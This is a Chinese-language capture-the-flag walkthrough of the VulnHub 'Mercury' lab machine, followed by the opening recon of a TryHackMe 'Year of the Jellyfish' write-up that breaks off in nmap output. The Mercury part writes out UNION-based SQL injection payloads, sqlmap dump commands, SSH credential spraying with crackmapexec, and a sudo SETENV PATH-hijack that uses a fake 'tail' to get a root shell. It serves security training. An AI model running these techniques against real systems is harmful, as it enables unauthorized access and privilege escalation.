tcp ports (reset)PORT     STATE SERVICE22/tcp   open  ssh8080/tcp open  http-proxy| http-slowloris-check: |   VULNERABLE:|   Slowloris DOS attack|     State: LIKELY VULNERABLE|     IDs:  CVE:CVE-2007-6750|       Slowloris tries to keep many connections to the target web server open and hold|       them open as long as possible.  It accomplishes this by opening connections to|       the target web server and sending a partial request. By doing so, it starves|       the http server&#x27;s resources causing Denial Of Service.|       |     Disclosure date: 2009-09-17|     References:|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750|_      http://ha.ckers.org/slowloris/| http-enum: |_  /robots.txt: Robots fileMAC Address: 08:00:27:80:E5:A9 (Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 522.27 seconds                                                                                             ┌──(kali㉿kali)-[~/vulnhub/mercury/workSpace]└─$ sudo nikto -h http://192.168.56.103:8080- Nikto v2.5.0---------------------------------------------------------------------------+ Target IP:          192.168.56.103+ Target Hostname:    192.168.56.103+ Target Port:        8080+ Start Time:         2023-05-23 21:38:54 (GMT8)---------------------------------------------------------------------------+ Server: WSGIServer/0.2 CPython/3.8.2+ No CGI Directories found (use &#x27;-C all&#x27; to force check all possible dirs)+ /SilverStream: SilverStream allows directory listing. See: https://web.archive.org/web/20011226154728/http://archives.neohapsis.com/archives/sf/pentest/2000-11/0147.html+ /static/: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/+ 8103 requests: 0 error(s) and 2 item(s) reported on remote host+ End Time:           2023-05-23 21:46:40 (GMT8) (466 seconds)---------------------------------------------------------------------------+ 1 host(s) tested\n只开了22和8080方法，漏扫也没什么有用结果。\n简单做个网页目录发现\n┌──(kali㉿kali)-[~/vulnhub/mercury/workSpace]└─$ sudo dirb http://192.168.56.103:8080                                              -----------------DIRB v2.22    By The Dark Raver-----------------START_TIME: Wed May 24 15:41:43 2023URL_BASE: http://192.168.56.103:8080/WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt-----------------GENERATED WORDS: 4612                                                          ---- Scanning URL: http://192.168.56.103:8080/ ----+ http://192.168.56.103:8080/robots.txt (CODE:200|SIZE:26)                                            -----------------END_TIME: Wed May 24 15:42:18 2023DOWNLOADED: 4612 - FOUND: 1\n只发现robots.txt，并且里面没啥有用信息。再在后台挂个feroxbuster +x php,txt,asp,zip确保目录发现没有遗漏什么重要信息。但是不能闲着啊，于是我们尝试手动发现一下，惊喜的发现404页面的错误信息给我们带来了有用信息。Django错误提示告诉我们有一个目录是mercuryfacts&#x2F;那我们就看看吧底下两个连接可以看看。先看看todo发现两个有用信息：认证用的表很可能是’users’；现有的mysql请求是直接用python写的不是用django写的，很有可能存在SQL注入漏洞。问题是哪里有SQLi漏洞，先不急看看另一个页面。这个URL的1很像查询的参数，多半有问题，加个引号试试OK，不仅有SQL注入漏洞还有很详细的错误信息。那就别客气开始吧。\nExploitManual SQLi先说一下手动方法。\n\n先用order by猜列数\n\n真就1列？OK，真就1列。\n\n列数确定了就可以UNION SELECT了。\n\n先用UNION SELECT database()查库名。再用UNION SELECT group_concat(table_name) from information_schema.tables where table_schema=database()查表名。注意，此处如果直接from information_schema.tables查只会得到默认库中的表名，获得不到mercury库的表信息，需要我们自己指定数据库where table_schema=database()才行。接下来UNION SELECT group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;查列名。小技巧，如果单引号被过滤可以用16进制表名绕过。东西都齐了直接查我们要的信息吧。UNION SELECT group concat(id,Ox7c,username,Ox7c,password)from users。Ox7c是’|’的hex值，主要是我们加进来为了分割一下结果。可以发现结果已经出来了。\nSQLMAP用sqlmap也可以，很快。\n┌──(kali㉿kali)-[~/vulnhub/mercury/workSpace]└─$ sudo sqlmap -u http://192.168.56.103:8080/mercuryfacts/ ┌──(kali㉿kali)-[~/vulnhub/mercury/workSpace]└─$ sudo sqlmap -u http://192.168.56.103:8080/mercuryfacts/ --dbs┌──(kali㉿kali)-[~/vulnhub/mercury/workSpace]└─$ sudo sqlmap -u http://192.168.56.103:8080/mercuryfacts/ -D mercury --tables┌──(kali㉿kali)-[~/vulnhub/mercury/workSpace]└─$ sudo sqlmap -u http://192.168.56.103:8080/mercuryfacts/ -D mercury -T users --columns┌──(kali㉿kali)-[~/vulnhub/mercury/workSpace]└─$ sudo sqlmap -u http://192.168.56.103:8080/mercuryfacts/ -D mercury -T users --dump\n我们将获得的结果存进一个文件里并简单处理下存进两个txt文件中供之后尝试ssh登录备用。\n┌──(kali㉿kali)-[~/vulnhub/mercury/workSpace]└─$ cat rawdata +----+-------------------------------+-----------+| id | password                      | username  |+----+-------------------------------+-----------+| 1  | johnny1987                    | john      || 2  | lovemykids111                 | laura     || 3  | lovemybeer111                 | sam       || 4  | mercuryisthesizeof0.056Earths | webmaster |+----+-------------------------------+-----------+┌──(kali㉿kali)-[~/vulnhub/mercury/workSpace]└─$ cat rawdata | awk -F &#x27;|&#x27; &#x27;&#123;print $3&#125;&#x27;  password                       johnny1987                     lovemykids111                  lovemybeer111                  mercuryisthesizeof0.056Earths  ┌──(kali㉿kali)-[~/vulnhub/mercury/workSpace]└─$ cat rawdata | awk -F &#x27;|&#x27; &#x27;&#123;print $3&#125;&#x27; &gt; pass.txt                                                                                                                             ┌──(kali㉿kali)-[~/vulnhub/mercury/workSpace]└─$ cat rawdata | awk -F &#x27;|&#x27; &#x27;&#123;print $4&#125;&#x27; &gt; username.txt\n\n┌──(kali㉿kali)-[~/vulnhub/mercury/workSpace]└─$ sudo crackmapexec ssh 192.168.56.103 -u username.txt -p pass.txt --continue-on-success[sudo] password for kali: SSH         192.168.56.103  22     192.168.56.103   [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.1SSH         192.168.56.103  22     192.168.56.103   [-] john:johnny1987 Authentication failed.SSH         192.168.56.103  22     192.168.56.103   [-] john:lovemykids111 Authentication failed.SSH         192.168.56.103  22     192.168.56.103   [-] john:lovemybeer111 Authentication failed.SSH         192.168.56.103  22     192.168.56.103   [-] john:mercuryisthesizeof0.056Earths Authentication failed.SSH         192.168.56.103  22     192.168.56.103   [-] john: Authentication failed.SSH         192.168.56.103  22     192.168.56.103   [-] john: Authentication failed.SSH         192.168.56.103  22     192.168.56.103   [-] laura:johnny1987 Authentication failed.SSH         192.168.56.103  22     192.168.56.103   [-] laura:lovemykids111 Authentication failed.SSH         192.168.56.103  22     192.168.56.103   [-] laura:lovemybeer111 Authentication failed.SSH         192.168.56.103  22     192.168.56.103   [-] laura:mercuryisthesizeof0.056Earths Authentication failed.SSH         192.168.56.103  22     192.168.56.103   [-] laura: Authentication failed.SSH         192.168.56.103  22     192.168.56.103   [-] laura: Authentication failed.SSH         192.168.56.103  22     192.168.56.103   [-] sam:johnny1987 Authentication failed.SSH         192.168.56.103  22     192.168.56.103   [-] sam:lovemykids111 Authentication failed.SSH         192.168.56.103  22     192.168.56.103   [-] sam:lovemybeer111 Authentication failed.SSH         192.168.56.103  22     192.168.56.103   [-] sam:mercuryisthesizeof0.056Earths Authentication failed.SSH         192.168.56.103  22     192.168.56.103   [-] sam: Authentication failed.SSH         192.168.56.103  22     192.168.56.103   [-] sam: Authentication failed.SSH         192.168.56.103  22     192.168.56.103   [-] webmaster:johnny1987 Authentication failed.SSH         192.168.56.103  22     192.168.56.103   [-] webmaster:lovemykids111 Authentication failed.SSH         192.168.56.103  22     192.168.56.103   [-] webmaster:lovemybeer111 Authentication failed.SSH         192.168.56.103  22     192.168.56.103   [+] webmaster:mercuryisthesizeof0.056Earths SSH         192.168.56.103  22     192.168.56.103   [-] webmaster: Authentication failed.SSH         192.168.56.103  22     192.168.56.103   [-] webmaster: Authentication failed.SSH         192.168.56.103  22     192.168.56.103   [-] :johnny1987 Authentication failed.SSH         192.168.56.103  22     192.168.56.103   [-] :lovemykids111 Authentication failed.SSH         192.168.56.103  22     192.168.56.103   [-] :lovemybeer111 Authentication failed.^C[*] Shutting down, please wait...\n发现有可以成功登录的凭证，懒得等他跑完了，直接登录吧。\nPriv Esca┌──(kali㉿kali)-[~/vulnhub/mercury/workSpace]└─$ ssh webmaster@192.168.56.103                                                          The authenticity of host &#x27;192.168.56.103 (192.168.56.103)&#x27; can&#x27;t be established.ED25519 key fingerprint is SHA256:mHhkDLhyH54cYFlptygnwr7NYpEtepsNhVAT8qzqcUk.This key is not known by any other names.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added &#x27;192.168.56.103&#x27; (ED25519) to the list of known hosts.webmaster@192.168.56.103&#x27;s password: Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-45-generic x86_64) * Documentation:  https://help.ubuntu.com * Management:     https://landscape.canonical.com * Support:        https://ubuntu.com/advantage  System information as of Tue 23 May 17:02:38 UTC 2023  System load:  0.0               Processes:               106  Usage of /:   74.9% of 4.86GB   Users logged in:         0  Memory usage: 30%               IPv4 address for enp0s3: 192.168.56.103  Swap usage:   0%22 updates can be installed immediately.0 of these updates are security updates.To see these additional updates run: apt list --upgradableThe list of available updates is more than a week old.To check for new updates run: sudo apt updateFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settingsLast login: Tue Sep  1 13:57:14 2020 from 192.168.31.136webmaster@mercury:~$ whoamiwebmasterwebmaster@mercury:~$ pwd/home/webmasterwebmaster@mercury:~/mercury_proj$ sudo -l[sudo] password for webmaster: Sorry, user webmaster may not run sudo on mercury.webmaster@mercury:~$ ls -latotal 36drwx------ 4 webmaster webmaster 4096 Sep  2  2020 .drwxr-xr-x 5 root      root      4096 Aug 28  2020 ..lrwxrwxrwx 1 webmaster webmaster    9 Sep  1  2020 .bash_history -&gt; /dev/null-rw-r--r-- 1 webmaster webmaster  220 Aug 27  2020 .bash_logout-rw-r--r-- 1 webmaster webmaster 3771 Aug 27  2020 .bashrcdrwx------ 2 webmaster webmaster 4096 Aug 27  2020 .cachedrwxrwxr-x 5 webmaster webmaster 4096 Aug 28  2020 mercury_proj-rw-r--r-- 1 webmaster webmaster  807 Aug 27  2020 .profile-rw-rw-r-- 1 webmaster webmaster   75 Sep  1  2020 .selected_editor-rw------- 1 webmaster webmaster   45 Sep  1  2020 user_flag.txtwebmaster@mercury:~$ cat user_flag.txt [user_flag_8339915c9a454657bd60ee58776f4ccd]\n拿到了user_flag。\nwebmaster@mercury:~$ cat .bash_history webmaster@mercury:~$ cd mercury_proj/webmaster@mercury:~/mercury_proj$ ls -latotal 28drwxrwxr-x 5 webmaster webmaster 4096 Aug 28  2020 .drwx------ 4 webmaster webmaster 4096 Sep  2  2020 ..-rw-r--r-- 1 webmaster webmaster    0 Aug 27  2020 db.sqlite3-rwxr-xr-x 1 webmaster webmaster  668 Aug 27  2020 manage.pydrwxrwxr-x 6 webmaster webmaster 4096 Sep  1  2020 mercury_factsdrwxrwxr-x 4 webmaster webmaster 4096 Aug 28  2020 mercury_indexdrwxrwxr-x 3 webmaster webmaster 4096 Aug 28  2020 mercury_proj-rw------- 1 webmaster webmaster  196 Aug 28  2020 notes.txtwebmaster@mercury:~/mercury_proj$ cat notes.txt Project accounts (both restricted):webmaster for web stuff - webmaster:bWVyY3VyeWlzdGhlc2l6ZW9mMC4wNTZFYXJ0aHMKlinuxmaster for linux stuff - linuxmaster:bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==webmaster@mercury:~/mercury_proj$ cat /etc/passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologinsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologinmessagebus:x:103:106::/nonexistent:/usr/sbin/nologinsyslog:x:104:110::/home/syslog:/usr/sbin/nologin_apt:x:105:65534::/nonexistent:/usr/sbin/nologintss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/falseuuidd:x:107:112::/run/uuidd:/usr/sbin/nologintcpdump:x:108:113::/nonexistent:/usr/sbin/nologinlandscape:x:109:115::/var/lib/landscape:/usr/sbin/nologinpollinate:x:110:1::/var/cache/pollinate:/bin/falsesshd:x:111:65534::/run/sshd:/usr/sbin/nologinsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologinmercury:x:1000:1000:mercury:/home/mercury:/bin/bashlxd:x:998:100::/var/snap/lxd/common/lxd:/bin/falsemysql:x:112:117:MySQL Server,,,:/nonexistent:/bin/falsewebmaster:x:1001:1001:,,,:/home/webmaster:/bin/bashlinuxmaster:x:1002:1002:,,,:/home/linuxmaster:/bin/bash\n先看看bash history，没内容。那么我们看看网页目录下有啥，有个notes.txt。查看一下，里面好像存了一个linuxmaster的登录凭证的base64编码。我们cat /etc/passwd确定确实有该用户，那我们echo &#39;bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==&#39; | base64 -d解码一下尝试登录看看能不能成。\nwebmaster@mercury:~/mercury_proj$ su linuxmasterPassword: linuxmaster@mercury:/home/webmaster/mercury_proj$ sudo -l[sudo] password for linuxmaster: Matching Defaults entries for linuxmaster on mercury:    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser linuxmaster may run the following commands on mercury:    (root : root) SETENV: /usr/bin/check_syslog.shlinuxmaster@mercury:/home/webmaster/mercury_proj$ cat /usr/bin/check_syslog.sh#!/bin/bashtail -n 10 /var/log/sysloglinuxmaster@mercury:/home/webmaster/mercury_proj$ ls -la /usr/bin/check_syslog.sh-rwxr-xr-x 1 root root 39 Aug 28  2020 /usr/bin/check_syslog.sh\n发现成功登录，查看sudo -l发现此用户可以以root身份无密码运行/usr/bin/check_syslog.sh且有SETENV权限。我们查看check_syslog.sh的内容，发现就是用tail查看下系统日志。值得注意的是，这里的tail是用相对路径而不是绝对路径写的，所以系统执行时从PATH中寻找的。正好此用户有SETENV的权限，那我们的提权思路就很明确了：我们伪造一个tail，并把其位置写在PATH前面，因为系统执行是从前往后寻找的，这样我们就能以root权限执行我们先要执行的命令了。\nlinuxmaster@mercury:/tmp$ echo &#x27;/bin/bash -p&#x27; &gt; taillinuxmaster@mercury:/tmp$ chmod +xs tail linuxmaster@mercury:/tmp$ ls -latotal 48drwxrwxrwt 10 root        root        4096 May 23 17:10 .drwxr-xr-x 19 root        root        4096 Sep  1  2020 ..-rwxr-xr-x  1 linuxmaster linuxmaster   39 May 23 17:05 backupdrwxrwxrwt  2 root        root        4096 May 23 13:14 .font-unixdrwxrwxrwt  2 root        root        4096 May 23 13:14 .ICE-unixdrwx------  3 root        root        4096 May 23 13:14 systemd-private-1295227d0ee948c7b42b8e747d46283d-systemd-logind.service-Pum4tf                                                                                                                    drwx------  3 root        root        4096 May 23 13:14 systemd-private-1295227d0ee948c7b42b8e747d46283d-systemd-resolved.service-OBDWgg                                                                                                                  drwx------  3 root        root        4096 May 23 13:14 systemd-private-1295227d0ee948c7b42b8e747d46283d-systemd-timesyncd.service-mA1HTi                                                                                                                 -rwsrwsr-x  1 linuxmaster linuxmaster   13 May 23 17:10 taildrwxrwxrwt  2 root        root        4096 May 23 13:14 .Test-unixdrwxrwxrwt  2 root        root        4096 May 23 13:14 .X11-unixdrwxrwxrwt  2 root        root        4096 May 23 13:14 .XIM-unixlinuxmaster@mercury:/tmp$ export PATH=/tmp:$PATHlinuxmaster@mercury:/tmp$ echo $PATH/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/gameslinuxmaster@mercury:/tmp$ sudo PATH=$PATH /usr/bin/check_syslog.sh root@mercury:/tmp# whoamirootroot@mercury:/tmp# ip a1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00    inet 127.0.0.1/8 scope host lo       valid_lft forever preferred_lft forever    inet6 ::1/128 scope host        valid_lft forever preferred_lft forever2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000    link/ether 08:00:27:80:e5:a9 brd ff:ff:ff:ff:ff:ff    inet 192.168.56.103/24 brd 192.168.56.255 scope global dynamic enp0s3       valid_lft 584sec preferred_lft 584sec    inet6 fe80::a00:27ff:fe80:e5a9/64 scope link        valid_lft forever preferred_lft foreverroot@mercury:/tmp# uname -aLinux mercury 5.4.0-45-generic #49-Ubuntu SMP Wed Aug 26 13:38:52 UTC 2020 x86_64 x86_64 x86_64 GNU/Linuxroot@mercury:/tmp# exitexitlinuxmaster@mercury:/tmp$ sudo --preserve-env=PATH /usr/bin/check_syslog.sh root@mercury:/tmp# iduid=0(root) gid=0(root) groups=0(root)root@mercury:/tmp# cd ~root@mercury:~# ls -latotal 56drwx------  5 root root 4096 Sep  2  2020 .drwxr-xr-x 19 root root 4096 Sep  1  2020 ..-rw-------  1 root root 3214 May 23 17:14 .bash_history-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrcdrwxr-xr-x  3 root root 4096 Aug 27  2020 .cache-rw-------  1 root root   34 Sep  1  2020 .lesshstdrwxr-xr-x  3 root root 4096 Aug 28  2020 .local-rw-------  1 root root 3619 Sep  1  2020 .mysql_history-rw-r--r--  1 root root  161 Dec  5  2019 .profile-rw-------  1 root root 1228 Sep  2  2020 root_flag.txtdrwx------  2 root root 4096 Aug 27  2020 .ssh-rw-------  1 root root 9454 Sep  2  2020 .viminforoot@mercury:~# cat root_flag.txt @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@/##////////@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(((/(*(/((((((////////&amp;@@@@@@@@@@@@@@@@@@@@@@@@((#(#(###((##//(((/(/(((*((//@@@@@@@@@@@@@@@@@@/#(((#((((((/(/,*/(((///////(/*/*/#@@@@@@@@@@@@@*((####((///*//(///*(/*//((/(((//**/((&amp;@@@@@@@@@@/(/(((##/*((//(#(////(((((/(///(((((///(*@@@@@@@@/(//((((#(((((*///*/(/(/(((/((////(/*/*(///@@@@@@//**/(/(#(#(##((/(((((/(**//////////((//((*/#@@@@@(//(/((((((#((((#*/((///((///((//////(/(/(*(/@@@@@((//((((/((((#(/(/((/(/(((((#((((((/(/((/////@@@@@(((/(((/##((#((/*///((/((/((##((/(/(/((((((/*@@@@@(((/(##/#(((##((/((((((/(##(/##(#((/((((#((*%@@@@@@(///(#(((((#(#(((((#(//((#((###((/(((((/(//@@@@@@@@(/*/(##(/(###(((#((((/((####/((((///((((/@@@@@@@@@@%//((((#############((((/((/(/(*/(((((@@@@@@@@@@@@@@%#(((############(##((#((*//(/(*//@@@@@@@@@@@@@@@@@@@/(#(####(###/((((((#(///((//(@@@@@@@@@@@@@@@@@@@@@@@@@(((###((#(#(((/((///*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%#(#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@Congratulations on completing Mercury!!!If you have any feedback please contact me at SirFlash@protonmail.com[root_flag_69426d9fda579afbffd9c2d47ca31d90]root@mercury:~#\n从上面的操作，我们可以看出对于SETENV权限，我们可以通过sudo PATH=$PATH /usr/bin/check_syslog.sh 或sudo --preserve-env=PATH /usr/bin/check_syslog.sh两种方式强制以当前用户PATH执行。\n","categories":["vulnhub"],"tags":["walkthrough"]},{"title":"[THM]  Year of the Jellyfish","url":"/2023/06/04/Year-of-the-Jellyfish/","content":"\n\n\n前言这台机子是tryhackme上的Year of the Jellyfish靶机，难度是hard，确实有点难度。信息收集的第一步就要避开很多兔子洞，以及要懂得看ssl证书信息。web渗透部分要有调整exp的能力，毕竟很多exp并不能拿上来就能成功利用，得自己调试修改。提权部分就主要是内核提权没什么说的。\n信息收集端口扫描\nroot@ip-10-10-242-231:~# sudo nmap -p- --min-rate 10000 34.240.221.73Starting Nmap 7.60 ( https://nmap.org ) at 2023-06-03 15:40 BSTNmap scan report for ec2-34-240-221-73.eu-west-1.compute.amazonaws.com (34.240.221.73)Host is up (0.00050s latency).Not shown: 65528 filtered portsPORT      STATE SERVICE21/tcp    open  ftp22/tcp    open  ssh80/tcp    open  http443/tcp   open  https8000/tcp  open  http-alt8096/tcp  open  unknown22222/tcp open  easyengineNmap done: 1 IP address (1 host up) scanned in 20.29 seconds\n\ntcp扫描，服务探测，系统识别\nroot@ip-10-10-242-231:~# sudo nmap -sT -sV -O -sC -p21,22,80,443,8000,8096,22222 34.240.221.73Starting Nmap 7.60 ( https://nmap.org ) at 2023-06-03 15:43 BSTNmap scan report for ec2-34-240-221-73.eu-west-1.compute.amazonaws.com (34.240.221.73)Host is up (0.00063s latency).PORT      STATE SERVICE  VERSION21/tcp    open  ftp      vsftpd 3.0.322/tcp    open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |_  2048 46:b2:81:be:e0:bc:a7:86:39:39:82:5b:bf:e5:65:58 (RSA)80/tcp    open  http     Apache httpd 2.4.29|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Did not follow redirect to https://robyns-petshop.thm/443/tcp   open  ssl/http Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Robyn&amp;#039;s Pet Shop| ssl-cert: Subject: commonName=robyns-petshop.thm/organizationName=Robyns Petshop/stateOrProvinceName=South West/countryName=GB| Subject Alternative Name: DNS:robyns-petshop.thm, DNS:monitorr.robyns-petshop.thm, DNS:beta.robyns-petshop.thm, DNS:dev.robyns-petshop.thm| Not valid before: 2023-06-03T14:34:57|_Not valid after:  2024-06-02T14:34:57|_ssl-date: TLS randomness does not represent time8000/tcp  open  http-alt| fingerprint-strings: |   GenericLines: |     HTTP/1.1 400 Bad Request|     Content-Length: 15|_    Request|_http-title: Under Development!8096/tcp  open  unknown| fingerprint-strings: |   FourOhFourRequest: |     HTTP/1.1 404 Not Found|     Connection: close|     Date: Sat, 03 Jun 2023 14:43:59 GMT|     Server: Kestrel|     Content-Length: 0|     X-Response-Time-ms: 210|   GenericLines: |     HTTP/1.1 400 Bad Request|     Connection: close|     Date: Sat, 03 Jun 2023 14:43:34 GMT|     Server: Kestrel|     Content-Length: 0|   GetRequest, HTTPOptions: |     HTTP/1.1 302 Found|     Connection: close|     Date: Sat, 03 Jun 2023 14:43:34 GMT|     Server: Kestrel|     Content-Length: 0|     Location: /web/index.html|   Help, Kerberos, SSLSessionReq, TLSSessionReq: |     HTTP/1.1 400 Bad Request|     Connection: close|     Date: Sat, 03 Jun 2023 14:43:49 GMT|     Server: Kestrel|     Content-Length: 0|   LDAPSearchReq, LPDString: |     HTTP/1.1 400 Bad Request|     Connection: close|     Date: Sat, 03 Jun 2023 14:43:59 GMT|     Server: Kestrel|     Content-Length: 0|   RTSPRequest: |     HTTP/1.1 505 HTTP Version Not Supported|     Connection: close|     Date: Sat, 03 Jun 2023 14:43:34 GMT|     Server: Kestrel|_    Content-Length: 022222/tcp open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 8d:99:92:52:8e:73:ed:91:01:d3:a7:a0:87:37:f0:4f (RSA)|   256 5a:c0:cc:a1:a8:79:eb:fd:6f:cf:f8:78:0d:2f:5d:db (ECDSA)|_  256 0a:ca:b8:39:4e:ca:e3:cf:86:5c:88:b9:2e:25:7a:1b (EdDSA)2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============SF-Port8000-TCP:V=7.60%I=7%D=6/3%Time=647B519B%P=x86_64-pc-linux-gnu%r(GenSF:ericLines,3F,&quot;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Length:\\x20SF:15\\r\\n\\r\\n400\\x20Bad\\x20Request&quot;);==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============SF-Port8096-TCP:V=7.60%I=7%D=6/3%Time=647B5196%P=x86_64-pc-linux-gnu%r(GenSF:ericLines,78,&quot;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20closSF:e\\r\\nDate:\\x20Sat,\\x2003\\x20Jun\\x202023\\x2014:43:34\\x20GMT\\r\\nServer:\\xSF:20Kestrel\\r\\nContent-Length:\\x200\\r\\n\\r\\n&quot;)%r(GetRequest,8D,&quot;HTTP/1\\.1\\SF:x20302\\x20Found\\r\\nConnection:\\x20close\\r\\nDate:\\x20Sat,\\x2003\\x20Jun\\xSF:202023\\x2014:43:34\\x20GMT\\r\\nServer:\\x20Kestrel\\r\\nContent-Length:\\x200SF:\\r\\nLocation:\\x20/web/index\\.html\\r\\n\\r\\n&quot;)%r(HTTPOptions,8D,&quot;HTTP/1\\.1SF:\\x20302\\x20Found\\r\\nConnection:\\x20close\\r\\nDate:\\x20Sat,\\x2003\\x20Jun\\SF:x202023\\x2014:43:34\\x20GMT\\r\\nServer:\\x20Kestrel\\r\\nContent-Length:\\x20SF:0\\r\\nLocation:\\x20/web/index\\.html\\r\\n\\r\\n&quot;)%r(RTSPRequest,87,&quot;HTTP/1\\.SF:1\\x20505\\x20HTTP\\x20Version\\x20Not\\x20Supported\\r\\nConnection:\\x20closeSF:\\r\\nDate:\\x20Sat,\\x2003\\x20Jun\\x202023\\x2014:43:34\\x20GMT\\r\\nServer:\\x2SF:0Kestrel\\r\\nContent-Length:\\x200\\r\\n\\r\\n&quot;)%r(Help,78,&quot;HTTP/1\\.1\\x20400\\SF:x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\nDate:\\x20Sat,\\x2003\\x20JunSF:\\x202023\\x2014:43:49\\x20GMT\\r\\nServer:\\x20Kestrel\\r\\nContent-Length:\\x2SF:00\\r\\n\\r\\n&quot;)%r(SSLSessionReq,78,&quot;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nSF:Connection:\\x20close\\r\\nDate:\\x20Sat,\\x2003\\x20Jun\\x202023\\x2014:43:49\\SF:x20GMT\\r\\nServer:\\x20Kestrel\\r\\nContent-Length:\\x200\\r\\n\\r\\n&quot;)%r(TLSSesSF:sionReq,78,&quot;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\SF:r\\nDate:\\x20Sat,\\x2003\\x20Jun\\x202023\\x2014:43:49\\x20GMT\\r\\nServer:\\x20SF:Kestrel\\r\\nContent-Length:\\x200\\r\\n\\r\\n&quot;)%r(Kerberos,78,&quot;HTTP/1\\.1\\x204SF:00\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\nDate:\\x20Sat,\\x2003\\x20SF:Jun\\x202023\\x2014:43:49\\x20GMT\\r\\nServer:\\x20Kestrel\\r\\nContent-Length:SF:\\x200\\r\\n\\r\\n&quot;)%r(FourOhFourRequest,8F,&quot;HTTP/1\\.1\\x20404\\x20Not\\x20FounSF:d\\r\\nConnection:\\x20close\\r\\nDate:\\x20Sat,\\x2003\\x20Jun\\x202023\\x2014:4SF:3:59\\x20GMT\\r\\nServer:\\x20Kestrel\\r\\nContent-Length:\\x200\\r\\nX-ResponseSF:-Time-ms:\\x20210\\r\\n\\r\\n&quot;)%r(LPDString,78,&quot;HTTP/1\\.1\\x20400\\x20Bad\\x20RSF:equest\\r\\nConnection:\\x20close\\r\\nDate:\\x20Sat,\\x2003\\x20Jun\\x202023\\x2SF:014:43:59\\x20GMT\\r\\nServer:\\x20Kestrel\\r\\nContent-Length:\\x200\\r\\n\\r\\n&quot;SF:)%r(LDAPSearchReq,78,&quot;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:SF:\\x20close\\r\\nDate:\\x20Sat,\\x2003\\x20Jun\\x202023\\x2014:43:59\\x20GMT\\r\\nSSF:erver:\\x20Kestrel\\r\\nContent-Length:\\x200\\r\\n\\r\\n&quot;);Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portAggressive OS guesses: Linux 2.6.32 (93%), Linux 3.10 (93%), Linux 3.10 - 4.8 (93%), Linux 3.2 - 4.8 (93%), Linux 3.4 - 3.10 (93%), Linux 2.6.32 - 3.10 (92%), Linux 2.6.32 - 3.13 (92%), Synology DiskStation Manager 5.2-5644 (91%), 